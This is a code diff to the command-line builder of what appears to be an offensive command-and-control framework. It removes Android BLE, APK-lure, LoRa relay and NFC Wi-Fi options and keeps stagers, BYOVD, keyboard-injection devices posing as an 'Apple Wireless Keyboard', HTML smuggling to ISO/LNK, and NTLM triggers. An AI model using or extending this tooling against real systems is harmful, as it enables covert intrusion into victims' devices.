@@ -310,10 +310,8 @@ from builders.stager  import generate_stager, generate_escalation_chain_params
 from builders.runner  import build_runner, build_runner_sc, build_runner_sc_c2
 from builders.byovd   import build_byovd, build_byovd_sc
 from builders.usbhid  import build_usb_payload, DEVICES as USB_DEVICES
-from builders.blehid   import build_ble_payload, DEVICES as BLE_DEVICES, build_android_ble_payload, ANDROID_DEVICES
-from builders.lora_c2  import build_lora_payload
-from builders.nfc_tag  import build_nfc_payload, build_nfc_wifi_payload
-from builders.android  import build_android_payload
+from builders.blehid   import build_ble_payload, DEVICES as BLE_DEVICES
+from builders.nfc_tag  import build_nfc_payload
 from builders.smuggle    import build_smuggle_payload, LURE_PRESETS as SMUGGLE_LURES, load_inject_js
 from builders.ntlm_trigger import build_ntlm_triggers
 from server.https_server import start_server, get_c2_sessions, _c2_push_task, _c2_get_result, set_engage_db
@@ -676,52 +674,6 @@ def cmd_build(args, cfg, ws):
         build_ble_payload(stager_url, ble_out, device=ble_dev, ble_name=ble_name)
         did_something = True
 
-    # ── Android BLE HID payload ───────────────────────────────────────────────
-    if getattr(args, "android_ble", False):
-        android_mode    = getattr(args, "android_mode",       "chrome")
-        android_ble_dev = getattr(args, "android_ble_device", "bruce")
-        android_ble_out = getattr(args, "android_ble_out",    None) or ws.path("ble_android")
-        android_ble_nm  = getattr(args, "android_ble_name",   "Pixel Accessories")
-        url_prefix      = cfg.get("url_prefix", "/cdn/static/v3")
-        if android_mode == "termux":
-            android_url = f"https://{lhost}:{port}/android/run.sh"
-        else:
-            android_url = f"https://{lhost}:{port}/android/"
-        build_android_ble_payload(
-            android_url, android_ble_out,
-            device   = android_ble_dev,
-            ble_name = android_ble_nm,
-            mode     = android_mode,
-        )
-        did_something = True
-
-    # ── Android server-side payload ───────────────────────────────────────────
-    if getattr(args, "android_payload", False):
-        android_mode = getattr(args, "android_mode", "chrome")
-        android_out  = getattr(args, "android_out",  None) or ws.path("android")
-        lport        = cfg.get("lport", 9999)
-        build_android_payload(
-            lhost, port, lport, android_out,
-            mode = android_mode,
-        )
-        did_something = True
-
-    # ── LoRa C2 relay (T-Embed Plus) ─────────────────────────────────────────
-    if getattr(args, "lora", False):
-        lora_out    = getattr(args, "lora_out",    None) or ws.path("lora")
-        lora_ssid   = getattr(args, "lora_ssid",   "MS_Update")
-        lora_pass   = getattr(args, "lora_pass",   "Upd@te2024!")
-        lora_freq   = getattr(args, "lora_freq",   915.0)
-        lora_serial = getattr(args, "lora_serial", "/dev/ttyUSB0")
-        build_lora_payload(
-            lora_out,
-            ssid        = lora_ssid,
-            password    = lora_pass,
-            freq_mhz    = lora_freq,
-            serial_port = lora_serial,
-        )
-        did_something = True
-
     # ── NFC tag NDEF payload ──────────────────────────────────────────────────
     if getattr(args, "nfc", False):
         nfc_out  = getattr(args, "nfc_out", None) or ws.path("nfc")
@@ -731,14 +683,6 @@ def cmd_build(args, cfg, ws):
             url_prefix = "/android/"
             nfc_url    = f"{scheme}://{lhost}:{port}{url_prefix}"
         build_nfc_payload(nfc_url, nfc_out)
-        did_something = True
-
-    # ── NFC WiFi Handover tag (auto-connects Android to T-Embed AP) ───────────
-    if getattr(args, "nfc_wifi", False):
-        nfc_wifi_out  = getattr(args, "nfc_wifi_out",  None) or ws.path("nfc")
-        nfc_wifi_ssid = getattr(args, "nfc_wifi_ssid", None) or cfg.get("lora_ssid", "MS_Update")
-        nfc_wifi_pass = getattr(args, "nfc_wifi_pass", None) or cfg.get("lora_pass", "Upd@te2024!")
-        build_nfc_wifi_payload(nfc_wifi_ssid, nfc_wifi_pass, nfc_wifi_out)
         did_something = True
 
     # ── HTML Smuggling → ISO → LNK ────────────────────────────────────────────
@@ -1556,48 +1500,12 @@ def main():
                          help="Output directory for BLE sketch folder (default: <workspace>/ble/)")
     build_p.add_argument("--ble-name",       metavar="NAME",  dest="ble_name",   default="Apple Wireless Keyboard",
                          help="BLE device name shown on target pairing dialog (default: 'Apple Wireless Keyboard')")
-    build_p.add_argument("--android-ble",     action="store_true", dest="android_ble",
-                         help="Generate BLE HID payload for M5StickC Plus2 targeting Android")
-    build_p.add_argument("--android-payload", action="store_true", dest="android_payload",
-                         help="Generate Android server-side delivery files (APK lure page + Termux stager)")
-    build_p.add_argument("--android-mode",   metavar="MODE",  dest="android_mode", default="chrome",
-                         choices=["chrome", "termux", "both"],
-                         help="Android delivery mode: chrome (APK download) | termux (ELF via Termux) | both  (default: chrome)")
-    build_p.add_argument("--android-ble-device", metavar="TYPE", dest="android_ble_device", default="bruce",
-                         choices=list(ANDROID_DEVICES) + ["all"],
-                         help="BLE device type for Android payload: m5stick | bruce | all  (default: bruce)")
-    build_p.add_argument("--android-ble-name",   metavar="NAME",  dest="android_ble_name",   default="Pixel Accessories",
-                         help="BLE device name shown on Android pairing dialog (default: 'Pixel Accessories')")
-    build_p.add_argument("--android-ble-out",    metavar="DIR",   dest="android_ble_out",    default=None,
-                         help="Output directory for Android BLE payload (default: <workspace>/ble_android/)")
-    build_p.add_argument("--android-out",        metavar="DIR",   dest="android_out",        default=None,
-                         help="Output directory for Android server-side files (default: <workspace>/android/)")
     build_p.add_argument("--nfc",          action="store_true", dest="nfc",
                          help="Generate NFC tag NDEF binary for mobile delivery (default URL: https://lhost:port/android/)")
     build_p.add_argument("--nfc-url",      metavar="URL",   dest="nfc_url",  default=None,
                          help="Override NFC tag URL (default: Android APK lure page)")
     build_p.add_argument("--nfc-out",      metavar="DIR",   dest="nfc_out",  default=None,
                          help="Output directory for NFC tag files (default: <workspace>/nfc/)")
-    build_p.add_argument("--nfc-wifi",     action="store_true", dest="nfc_wifi",
-                         help="Generate NFC WiFi Handover tag (WFA WSC): Android auto-connects to T-Embed AP on tap")
-    build_p.add_argument("--nfc-wifi-ssid", metavar="SSID", dest="nfc_wifi_ssid", default=None,
-                         help="SSID for NFC WiFi Handover tag (default: lora_ssid from config or MS_Update)")
-    build_p.add_argument("--nfc-wifi-pass", metavar="PASS", dest="nfc_wifi_pass", default=None,
-                         help="WPA2 passphrase for NFC WiFi Handover tag (default: lora_pass from config)")
-    build_p.add_argument("--nfc-wifi-out",  metavar="DIR",  dest="nfc_wifi_out",  default=None,
-                         help="Output directory for WiFi Handover NDEF (default: <workspace>/nfc/)")
-    build_p.add_argument("--lora",         action="store_true", dest="lora",
-                         help="Generate LoRa C2 relay kit: T-Embed Plus WiFi AP + LoRa bridge + PS1 beacon loop")
-    build_p.add_argument("--lora-ssid",    metavar="SSID",  dest="lora_ssid",   default="MS_Update",
-                         help="WiFi AP SSID broadcast by T-Embed relay (default: MS_Update)")
-    build_p.add_argument("--lora-pass",    metavar="PASS",  dest="lora_pass",   default="Upd@te2024!",
-                         help="WPA2 password for T-Embed AP (default: Upd@te2024!)")
-    build_p.add_argument("--lora-freq",    metavar="MHZ",   dest="lora_freq",   type=float, default=915.0,
-                         help="LoRa frequency in MHz: 915.0 (BR/US) | 868.0 (EU)  (default: 915.0)")
-    build_p.add_argument("--lora-serial",  metavar="PORT",  dest="lora_serial", default="/dev/ttyUSB0",
-                         help="Operator receiver serial port for lora_listener.py (default: /dev/ttyUSB0)")
-    build_p.add_argument("--lora-out",     metavar="DIR",   dest="lora_out",    default=None,
-                         help="Output directory for LoRa C2 kit (default: <workspace>/lora/)")
     build_p.add_argument("--smuggle",        metavar="TOOL",  dest="smuggle", nargs="?", const="__c2_agent__",
                          help="HTML smuggling → ISO → LNK (tool name, or bare --smuggle for C2 agent stager)")
     build_p.add_argument("--smuggle-lure",   metavar="THEME", dest="smuggle_lure", default="update",
